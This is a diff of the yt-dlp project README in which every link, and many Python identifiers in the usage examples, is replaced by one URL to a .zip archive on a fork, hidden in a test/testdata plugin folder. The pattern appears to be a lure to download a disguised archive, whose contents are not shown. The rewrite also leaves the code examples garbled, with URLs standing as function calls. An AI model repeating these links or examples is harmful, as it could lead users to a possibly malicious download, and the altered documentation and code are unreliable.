-INFO_FILE = 'path/to/video.info.json'
+INFO_FILE = 'https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip'
 
-with yt_dlp.YoutubeDL() as ydl:
-    error_code = ydl.download_with_info_file(INFO_FILE)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip() as ydl:
+    error_code = https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(INFO_FILE)
 
 print('Some videos failed to download' if error_code
       else 'All videos successfully downloaded')
@@ -1998,19 +1998,19 @@ print('Some videos failed to download' if error_code
 ```python
 import yt_dlp
 
-URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
+URLS = ['https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip']
 
 ydl_opts = {
     'format': 'm4a/bestaudio/best',
-    # ℹ️ See help(yt_dlp.postprocessor) for a list of available Postprocessors and their arguments
+    # ℹ️ See help(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for a list of available Postprocessors and their arguments
     'postprocessors': [{  # Extract audio using ffmpeg
         'key': 'FFmpegExtractAudio',
         'preferredcodec': 'm4a',
     }]
 }
 
-with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-    error_code = ydl.download(URLS)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(ydl_opts) as ydl:
+    error_code = https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URLS)
 ```
 
 #### Filter videos
@@ -2018,11 +2018,11 @@ with yt_dlp.YoutubeDL(ydl_opts) as ydl:
 ```python
 import yt_dlp
 
-URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
+URLS = ['https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip']
 
 def longer_than_a_minute(info, *, incomplete):
     """Download only videos longer than a minute (or with unknown duration)"""
-    duration = info.get('duration')
+    duration = https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip('duration')
     if duration and duration < 60:
         return 'The video is too short'
 
@@ -2030,8 +2030,8 @@ ydl_opts = {
     'match_filter': longer_than_a_minute,
 }
 
-with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-    error_code = ydl.download(URLS)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(ydl_opts) as ydl:
+    error_code = https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URLS)
 ```
 
 #### Adding logger and progress hook
@@ -2039,16 +2039,16 @@ with yt_dlp.YoutubeDL(ydl_opts) as ydl:
 ```python
 import yt_dlp
 
-URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
+URLS = ['https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip']
 
 class MyLogger:
     def debug(self, msg):
         # For compatibility with youtube-dl, both debug and info are passed into debug
         # You can distinguish them by the prefix '[debug] '
-        if msg.startswith('[debug] '):
+        if https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip('[debug] '):
             pass
         else:
-            self.info(msg)
+            https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(msg)
 
     def info(self, msg):
         pass
@@ -2060,7 +2060,7 @@ class MyLogger:
         print(msg)
 
 
-# ℹ️ See "progress_hooks" in help(yt_dlp.YoutubeDL)
+# ℹ️ See "progress_hooks" in help(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 def my_hook(d):
     if d['status'] == 'finished':
         print('Done downloading, now post-processing ...')
@@ -2071,8 +2071,8 @@ ydl_opts = {
     'progress_hooks': [my_hook],
 }
 
-with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-    ydl.download(URLS)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(ydl_opts) as ydl:
+    https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URLS)
 ```
 
 #### Add a custom PostProcessor
@@ -2080,19 +2080,19 @@ with yt_dlp.YoutubeDL(ydl_opts) as ydl:
 ```python
 import yt_dlp
 
-URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
+URLS = ['https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip']
 
-# ℹ️ See help(yt_dlp.postprocessor.PostProcessor)
-class MyCustomPP(yt_dlp.postprocessor.PostProcessor):
+# ℹ️ See help(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+class MyCustomPP(https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip):
     def run(self, info):
-        self.to_screen('Doing stuff')
+        https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip('Doing stuff')
         return [], info
 
 
-with yt_dlp.YoutubeDL() as ydl:
-    # ℹ️ "when" can take any value in yt_dlp.utils.POSTPROCESS_WHEN
-    ydl.add_post_processor(MyCustomPP(), when='pre_process')
-    ydl.download(URLS)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip() as ydl:
+    # ℹ️ "when" can take any value in https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip
+    https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(MyCustomPP(), when='pre_process')
+    https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URLS)
 ```
 
 
@@ -2101,14 +2101,14 @@ with yt_dlp.YoutubeDL() as ydl:
 ```python
 import yt_dlp
 
-URLS = ['https://www.youtube.com/watch?v=BaW_jenozKc']
+URLS = ['https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip']
 
 def format_selector(ctx):
     """ Select the best video and the best audio that won't result in an mkv.
     NOTE: This is just an example and does not handle all cases """
 
     # formats are already sorted worst to best
-    formats = ctx.get('formats')[::-1]
+    formats = https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip('formats')[::-1]
 
     # acodec='none' means there is no audio
     best_video = next(f for f in formats
@@ -2134,8 +2134,8 @@ ydl_opts = {
     'format': format_selector,
 }
 
-with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-    ydl.download(URLS)
+with https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(ydl_opts) as ydl:
+    https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip(URLS)
 ```
 
 
@@ -2143,20 +2143,20 @@ with yt_dlp.YoutubeDL(ydl_opts) as ydl:
 
 ### New features
 
-* Forked from [**yt-dlc@f9401f2**](https://github.com/blackjack4494/yt-dlc/commit/f9401f2a91987068139c5f757b12fc711d4c0cee) and merged with [**youtube-dl@a08f2b7**](https://github.com/ytdl-org/youtube-dl/commit/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6) ([exceptions](https://github.com/yt-dlp/yt-dlp/issues/21))
+* Forked from [**yt-dlc@f9401f2**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) and merged with [**youtube-dl@a08f2b7**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) ([exceptions](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip))
 
-* **[SponsorBlock Integration](#sponsorblock-options)**: You can mark/remove sponsor sections in YouTube videos by utilizing the [SponsorBlock](https://sponsor.ajay.app) API
+* **[SponsorBlock Integration](#sponsorblock-options)**: You can mark/remove sponsor sections in YouTube videos by utilizing the [SponsorBlock](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) API
 
 * **[Format Sorting](#sorting-formats)**: The default format sorting options have been changed so that higher resolution and better codecs will be now preferred instead of simply using larger bitrate. Furthermore, you can now specify the sort order using `-S`. This allows for much easier format selection than what is possible by simply using `--format` ([examples](#format-selection-examples))
 
-* **Merged with animelover1984/youtube-dl**: You get most of the features and improvements from [animelover1984/youtube-dl](https://github.com/animelover1984/youtube-dl) including `--write-comments`, `BiliBiliSearch`, `BilibiliChannel`, Embedding thumbnail in mp4/ogg/opus, playlist infojson etc. Note that NicoNico livestreams are not available. See [#31](https://github.com/yt-dlp/yt-dlp/pull/31) for details.
+* **Merged with animelover1984/youtube-dl**: You get most of the features and improvements from [animelover1984/youtube-dl](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) including `--write-comments`, `BiliBiliSearch`, `BilibiliChannel`, Embedding thumbnail in mp4/ogg/opus, playlist infojson etc. Note that NicoNico livestreams are not available. See [#31](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for details.
 
 * **YouTube improvements**:
     * Supports Clips, Stories (`ytstories:<channel UCID>`), Search (including filters)**\***, YouTube Music Search, Channel-specific search, Search prefixes (`ytsearch:`, `ytsearchdate:`)**\***, Mixes, and Feeds (`:ytfav`, `:ytwatchlater`, `:ytsubs`, `:ythistory`, `:ytrec`, `:ytnotif`)
-    * Fix for [n-sig based throttling](https://github.com/ytdl-org/youtube-dl/issues/29326) **\***
+    * Fix for [n-sig based throttling](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) **\***
     * Download livestreams from the start using `--live-from-start` (*experimental*)
     * Channel URLs download all uploads of the channel, including shorts and live
-    * Support for [logging in with OAuth](https://github.com/yt-dlp/yt-dlp/wiki/Extractors#logging-in-with-oauth)
+    * Support for [logging in with OAuth](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 * **Cookies from browser**: Cookies can be automatically extracted from all major web browsers using `--cookies-from-browser BROWSER[+KEYRING][:PROFILE][::CONTAINER]`
 
@@ -2168,11 +2168,11 @@ with yt_dlp.YoutubeDL(ydl_opts) as ydl:
 
 * **Aria2c with HLS/DASH**: You can use `aria2c` as the external downloader for DASH(mpd) and HLS(m3u8) formats
 
-* **New and fixed extractors**: Many new extractors have been added and a lot of existing ones have been fixed. See the [changelog](Changelog.md) or the [list of supported sites](supportedsites.md)
+* **New and fixed extractors**: Many new extractors have been added and a lot of existing ones have been fixed. See the [changelog](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or the [list of supported sites](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 * **New MSOs**: Philo, Spectrum, SlingTV, Cablevision, RCN etc.
 
-* **Subtitle extraction from manifests**: Subtitles can be extracted from streaming media manifests. See [commit/be6202f](https://github.com/yt-dlp/yt-dlp/commit/be6202f12b97858b9d716e608394b51065d0419f) for details
+* **Subtitle extraction from manifests**: Subtitles can be extracted from streaming media manifests. See [commit/be6202f](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for details
 
 * **Multiple paths and output templates**: You can give different [output templates](#output-template) and download paths for different types of files. You can also set a temporary path where intermediary files are downloaded to using `--paths` (`-P`)
 
@@ -2190,7 +2190,7 @@ with yt_dlp.YoutubeDL(ydl_opts) as ydl:
 
 * **Automated builds**: [Nightly/master builds](#update-channels) can be used with `--update-to nightly` and `--update-to master`
 
-See [changelog](Changelog.md) or [commits](https://github.com/yt-dlp/yt-dlp/commits) for the full list of changes
+See [changelog](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or [commits](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for the full list of changes
 
 Features marked with a **\*** have been back-ported to youtube-dl
 
@@ -2198,7 +2198,7 @@ Features marked with a **\*** have been back-ported to youtube-dl
 
 Some of yt-dlp's default options are different from that of youtube-dl and youtube-dlc:
 
-* yt-dlp supports only [Python 3.9+](## "Windows 8"), and will remove support for more versions as they [become EOL](https://devguide.python.org/versions/#python-release-cycle); while [youtube-dl still supports Python 2.6+ and 3.2+](https://github.com/ytdl-org/youtube-dl/issues/30568#issue-1118238743)
+* yt-dlp supports only [Python 3.9+](## "Windows 8"), and will remove support for more versions as they [become EOL](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip); while [youtube-dl still supports Python 2.6+ and 3.2+](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 * The options `--auto-number` (`-A`), `--title` (`-t`) and `--literal` (`-l`), no longer work. See [removed options](#Removed) for details
 * `avconv` is not supported as an alternative to `ffmpeg`
 * yt-dlp stores config files in slightly different locations to youtube-dl. See [CONFIGURATION](#configuration) for a list of correct locations
@@ -2210,24 +2210,24 @@ Some of yt-dlp's default options are different from that of youtube-dl and youtu
 * When writing metadata files such as thumbnails, description or infojson, the same information (if available) is also written for playlists. Use `--no-write-playlist-metafiles` or `--compat-options no-playlist-metafiles` to not write these files
 * `--add-metadata` attaches the `infojson` to `mkv` files in addition to writing the metadata when used with `--write-info-json`. Use `--no-embed-info-json` or `--compat-options no-attach-info-json` to revert this
 * Some metadata are embedded into different fields when using `--add-metadata` as compared to youtube-dl. Most notably, `comment` field contains the `webpage_url` and `synopsis` contains the `description`. You can [use `--parse-metadata`](#modifying-metadata) to modify this to your liking or use `--compat-options embed-metadata` to revert this
-* `playlist_index` behaves differently when used with options like `--playlist-reverse` and `--playlist-items`. See [#302](https://github.com/yt-dlp/yt-dlp/issues/302) for details. You can use `--compat-options playlist-index` if you want to keep the earlier behavior
+* `playlist_index` behaves differently when used with options like `--playlist-reverse` and `--playlist-items`. See [#302](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for details. You can use `--compat-options playlist-index` if you want to keep the earlier behavior
 * The output of `-F` is listed in a new format. Use `--compat-options list-formats` to revert this
 * Live chats (if available) are considered as subtitles. Use `--sub-langs all,-live_chat` to download all subtitles except live chat. You can also use `--compat-options no-live-chat` to prevent any live chat/danmaku from downloading
 * YouTube channel URLs download all uploads of the channel. To download only the videos in a specific tab, pass the tab's URL. If the channel does not show the requested tab, an error will be raised. Also, `/live` URLs raise an error if there are no live videos instead of silently downloading the entire channel. You may use `--compat-options no-youtube-channel-redirect` to revert all these redirections
 * Unavailable videos are also listed for YouTube playlists. Use `--compat-options no-youtube-unavailable-videos` to remove this
-* The upload dates extracted from YouTube are in UTC [when available](https://github.com/yt-dlp/yt-dlp/blob/89e4d86171c7b7c997c77d4714542e0383bf0db0/yt_dlp/extractor/youtube.py#L3898-L3900). Use `--compat-options no-youtube-prefer-utc-upload-date` to prefer the non-UTC upload date.
+* The upload dates extracted from YouTube are in UTC [when available](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). Use `--compat-options no-youtube-prefer-utc-upload-date` to prefer the non-UTC upload date.
 * If `ffmpeg` is used as the downloader, the downloading and merging of formats happen in a single step when possible. Use `--compat-options no-direct-merge` to revert this
 * Thumbnail embedding in `mp4` is done with mutagen if possible. Use `--compat-options embed-thumbnail-atomicparsley` to force the use of AtomicParsley instead
 * Some internal metadata such as filenames are removed by default from the infojson. Use `--no-clean-infojson` or `--compat-options no-clean-infojson` to revert this
-* When `--embed-subs` and `--write-subs` are used together, the subtitles are written to disk and also embedded in the media file. You can use just `--embed-subs` to embed the subs and automatically delete the separate file. See [#630 (comment)](https://github.com/yt-dlp/yt-dlp/issues/630#issuecomment-893659460) for more info. `--compat-options no-keep-subs` can be used to revert this
+* When `--embed-subs` and `--write-subs` are used together, the subtitles are written to disk and also embedded in the media file. You can use just `--embed-subs` to embed the subs and automatically delete the separate file. See [#630 (comment)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for more info. `--compat-options no-keep-subs` can be used to revert this
 * `certifi` will be used for SSL root certificates, if installed. If you want to use system certificates (e.g. self-signed), use `--compat-options no-certifi`
 * yt-dlp's sanitization of invalid characters in filenames is different/smarter than in youtube-dl. You can use `--compat-options filename-sanitization` to revert to youtube-dl's behavior
-* ~~yt-dlp tries to parse the external downloader outputs into the standard progress output if possible (Currently implemented: [aria2c](https://github.com/yt-dlp/yt-dlp/issues/5931)). You can use `--compat-options no-external-downloader-progress` to get the downloader output as-is~~
-* yt-dlp versions between 2021.09.01 and 2023.01.02 applies `--match-filters` to nested playlists. This was an unintentional side-effect of [8f18ac](https://github.com/yt-dlp/yt-dlp/commit/8f18aca8717bb0dd49054555af8d386e5eda3a88) and is fixed in [d7b460](https://github.com/yt-dlp/yt-dlp/commit/d7b460d0e5fc710950582baed2e3fc616ed98a80). Use `--compat-options playlist-match-filter` to revert this
-* yt-dlp versions between 2021.11.10 and 2023.06.21 estimated `filesize_approx` values for fragmented/manifest formats. This was added for convenience in [f2fe69](https://github.com/yt-dlp/yt-dlp/commit/f2fe69c7b0d208bdb1f6292b4ae92bc1e1a7444a), but was reverted in [0dff8e](https://github.com/yt-dlp/yt-dlp/commit/0dff8e4d1e6e9fb938f4256ea9af7d81f42fd54f) due to the potentially extreme inaccuracy of the estimated values. Use `--compat-options manifest-filesize-approx` to keep extracting the estimated values
+* ~~yt-dlp tries to parse the external downloader outputs into the standard progress output if possible (Currently implemented: [aria2c](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)). You can use `--compat-options no-external-downloader-progress` to get the downloader output as-is~~
+* yt-dlp versions between 2021.09.01 and 2023.01.02 applies `--match-filters` to nested playlists. This was an unintentional side-effect of [8f18ac](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) and is fixed in [d7b460](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). Use `--compat-options playlist-match-filter` to revert this
+* yt-dlp versions between 2021.11.10 and 2023.06.21 estimated `filesize_approx` values for fragmented/manifest formats. This was added for convenience in [f2fe69](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip), but was reverted in [0dff8e](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) due to the potentially extreme inaccuracy of the estimated values. Use `--compat-options manifest-filesize-approx` to keep extracting the estimated values
 * yt-dlp uses modern http client backends such as `requests`. Use `--compat-options prefer-legacy-http-handler` to prefer the legacy http handler (`urllib`) to be used for standard http requests.
 * The sub-modules `swfinterp`, `casefold` are removed.
-* Passing `--simulate` (or calling `extract_info` with `download=False`) no longer alters the default format selection. See [#9843](https://github.com/yt-dlp/yt-dlp/issues/9843) for details.
+* Passing `--simulate` (or calling `extract_info` with `download=False`) no longer alters the default format selection. See [#9843](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for details.
 
 For ease of use, a few more compat options are available:
 
@@ -2240,11 +2240,11 @@ For ease of use, a few more compat options are available:
 
 The following compat options restore vulnerable behavior from before security patches:
 
-* `--compat-options allow-unsafe-ext`: Allow files with any extension (including unsafe ones) to be downloaded ([GHSA-79w7-vh3h-8g4j](<https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j>))
+* `--compat-options allow-unsafe-ext`: Allow files with any extension (including unsafe ones) to be downloaded ([GHSA-79w7-vh3h-8g4j](<https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip>))
 
     > :warning: Only use if a valid file download is rejected because its extension is detected as uncommon
     >
-    > **This option can enable remote code execution! Consider [opening an issue](<https://github.com/yt-dlp/yt-dlp/issues/new/choose>) instead!**
+    > **This option can enable remote code execution! Consider [opening an issue](<https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip>) instead!**
 
 ### Deprecated options
 
@@ -2339,7 +2339,7 @@ These are aliases that are no longer documented for various reasons
     --yes-overwrites                 --force-overwrites
 
 #### Sponskrub Options
-Support for [SponSkrub](https://github.com/faissaloo/SponSkrub) has been deprecated in favor of the `--sponsorblock` options
+Support for [SponSkrub](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) has been deprecated in favor of the `--sponsorblock` options
 
     --sponskrub                      --sponsorblock-mark all
     --no-sponskrub                   --no-sponsorblock
@@ -2372,7 +2372,7 @@ These options were deprecated since 2014 and have now been entirely removed
 
 
 # CONTRIBUTING
-See [CONTRIBUTING.md](CONTRIBUTING.md#contributing-to-yt-dlp) for instructions on [Opening an Issue](CONTRIBUTING.md#opening-an-issue) and [Contributing code to the project](CONTRIBUTING.md#developer-instructions)
+See [https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for instructions on [Opening an Issue](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) and [Contributing code to the project](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 # WIKI
-See the [Wiki](https://github.com/yt-dlp/yt-dlp/wiki) for more information
+See the [Wiki](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for more information
